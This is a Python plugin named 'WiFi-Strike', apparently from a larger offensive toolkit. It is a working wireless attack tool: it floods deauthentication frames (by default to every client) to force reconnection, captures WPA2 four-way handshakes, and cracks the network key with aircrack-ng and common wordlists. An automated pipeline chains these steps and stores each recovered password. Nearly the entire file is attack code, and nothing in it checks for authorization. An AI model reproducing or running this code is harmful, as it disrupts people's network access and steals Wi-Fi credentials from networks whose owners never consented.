from core.plugin_manager import BasePlugin
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, sniff, EAPOL, wrpcap
import asyncio
import threading
import subprocess
import re
import os
import time


class WiFiAttackPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.interface = "wlan0"
        self.handshakes = []
        self.deauth_targets = []
        self.threads = []
        self._capture_dir = "captures"
        os.makedirs(self._capture_dir, exist_ok=True)

    @property
    def name(self) -> str:
        return "WiFi-Strike"

    @property
    def description(self) -> str:
        return "Tactical Deauth & Handshake Capture"

    async def start(self, interface=None):
        if interface:
            self.interface = interface
        else:
            # Auto-detect first wireless interface on Linux
            try:
                for iface in os.listdir("/sys/class/net"):
                    if iface.startswith(("wlan", "wlp", "wlx")):
                        self.interface = iface
                        break
            except Exception:
                pass
        self.running = True
        self.emit("INFO", {"msg": f"WiFi-Strike: interface={self.interface}"})
        print(f"WiFi-Strike: Initializing on {self.interface}...")

    async def stop(self):
        self.running = False
        print("WiFi-Strike: Ceasing all wireless operations.")

    async def deauth(self, target_mac=None, ap_mac=None, count=100):
        if not target_mac and self.target_store and self.target_store.devices:
            target_mac = self.target_store.devices[0].get("mac", "ff:ff:ff:ff:ff:ff")
            self.emit("INFO", {"msg": f"WiFi-Strike: AUTO-TARGET {target_mac}"})

        if not ap_mac:
            ap_mac = "ff:ff:ff:ff:ff:ff"

        print(f"WiFi-Strike: Launching Deauth against {target_mac} via {ap_mac}")
        try:
            dot11  = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        except Exception as exc:
            self.emit("ERROR", {"msg": f"WiFi-Strike frame error: {exc}"})
            return {"status": "frame construction failed", "error": str(exc)}

        def run_deauth():
            try:
                for i in range(count):
                    if not self.running:
                        break
                    sendp(packet, iface=self.interface, verbose=False)
                    if i % 10 == 0:
                        self.emit("DEAUTH_BURST", {"seq": i, "target": target_mac})
                    time.sleep(0.1)
            except Exception as exc:
                self.emit("ERROR", {"msg": f"WiFi-Strike deauth error: {exc}"})

        t = threading.Thread(target=run_deauth, daemon=True)
        t.start()
        self.threads.append(t)
        self.emit("INFO", {"msg": f"Deauth burst (count={count}) launched → {ap_mac}"})
        return {"status": "deauth_active", "target": target_mac, "ap": ap_mac, "count": count}

    async def capture_handshake(self, bssid: str, timeout: int = 60):
        print(f"WiFi-Strike: Monitoring for {bssid} handshakes...")
        captured: list = []

        def handle_pkt(pkt):
            if EAPOL in pkt and hasattr(pkt, "addr3") and pkt.addr3 == bssid:
                captured.append(pkt)
                self.emit("EAPOL_FRAME", {"bssid": bssid, "frame": len(captured)})
                print(f"[!] WiFi-Strike: EAPOL frame {len(captured)}/4 from {bssid}")

        def run_sniff():
            sniff(
                iface=self.interface,
                prn=handle_pkt,
                stop_filter=lambda _: len(captured) >= 4 or not self.running,
                timeout=timeout,
            )
            if len(captured) >= 4:
                filename = os.path.join(
                    self._capture_dir,
                    f"handshake_{bssid.replace(':', '')}.pcap"
                )
                wrpcap(filename, captured)
                entry = {"bssid": bssid, "file": filename, "frames": len(captured)}
                self.handshakes.append(entry)
                self.emit("HANDSHAKE_CAPTURED", entry)
                print(f"[+] WiFi-Strike: Handshake saved → {filename}")
                # Attempt offline crack immediately
                crack_result = self._try_crack(filename, bssid)
                if crack_result:
                    self.emit("CREDENTIAL_FOUND", {"bssid": bssid, "password": crack_result})
                    if self.target_store:
                        self.target_store.save_credential(f"WPA2:{bssid}", crack_result)

        t = threading.Thread(target=run_sniff, daemon=True)
        t.start()
        self.threads.append(t)
        return {"status": "handshake_monitor_active", "target": bssid, "timeout": timeout}

    # ------------------------------------------------------------------
    # Offline WPA2 crack via aircrack-ng
    # ------------------------------------------------------------------

    _WORDLISTS = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/john/password.lst",
    ]

    def _try_crack(self, pcap_path: str, bssid: str) -> str | None:
        for wordlist in self._WORDLISTS:
            if not os.path.exists(wordlist):
                continue
            try:
                result = subprocess.run(
                    ["aircrack-ng", "-b", bssid, "-w", wordlist, pcap_path],
                    capture_output=True, text=True, timeout=120,
                )
                m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
                if m:
                    return m.group(1)
            except (FileNotFoundError, subprocess.TimeoutExpired):
                pass
        return None

    # ------------------------------------------------------------------
    # Option C — Automated pipeline: deauth → capture → crack → store
    # ------------------------------------------------------------------

    async def auto_attack(
        self,
        bssid: str,
        clients: list[str] | None = None,
        timeout: int = 90,
    ) -> dict:
        """
        Chain deauth waves with live EAPOL sniffing.  Sends deauth bursts to
        force clients to re-associate (triggering a 4-way handshake), captures
        the handshake, then cracks offline with aircrack-ng.
        Returns {"bssid": ..., "cracked": bool, "key": str|None}.
        """
        self.log_event(f"AUTO-ATTACK initiated on {bssid}", "START")
        self.emit("AUTO_ATTACK_START", {"bssid": bssid})

        found_key: list[str] = []
        done_event = threading.Event()

        def _sniff_loop():
            captured: list = []

            def _pkt(pkt):
                if EAPOL in pkt and getattr(pkt, "addr3", None) == bssid:
                    captured.append(pkt)
                    self.emit("EAPOL_FRAME", {"bssid": bssid, "frame": len(captured)})

            sniff(
                iface=self.interface,
                prn=_pkt,
                stop_filter=lambda _: len(captured) >= 4 or done_event.is_set(),
                timeout=timeout,
            )

            if len(captured) >= 4:
                fname = os.path.join(
                    self._capture_dir,
                    f"autoattack_{bssid.replace(':', '')}.pcap",
                )
                wrpcap(fname, captured)
                self.handshakes.append({"bssid": bssid, "file": fname, "frames": len(captured)})
                self.emit("HANDSHAKE_CAPTURED", {"bssid": bssid, "frames": len(captured)})
                key = self._try_crack(fname, bssid)
                if key:
                    found_key.append(key)
                    self.emit("CREDENTIAL_FOUND", {"bssid": bssid, "password": key})
                    if self.target_store:
                        self.target_store.save_credential(
                            f"WiFi-AutoAttack:WPA2:{bssid}", key
                        )
            done_event.set()

        t = threading.Thread(target=_sniff_loop, daemon=True)
        t.start()
        self.threads.append(t)

        burst_targets = clients or ["ff:ff:ff:ff:ff:ff"]
        for wave in range(4):
            if done_event.is_set():
                break
            for mac in burst_targets:
                await self.deauth(target_mac=mac, ap_mac=bssid, count=20)
            self.emit("AUTO_ATTACK_WAVE", {"wave": wave + 1, "bssid": bssid})
            await asyncio.sleep(10)

        await asyncio.to_thread(done_event.wait, timeout)

        key = found_key[0] if found_key else None
        self.emit("AUTO_ATTACK_DONE", {"bssid": bssid, "success": bool(key), "key": key})
        self.log_event(
            f"AUTO-ATTACK {'SUCCESS → ' + key if key else 'handshake only (crack failed)'} on {bssid}",
            "DONE",
        )
        return {"bssid": bssid, "cracked": bool(key), "key": key}
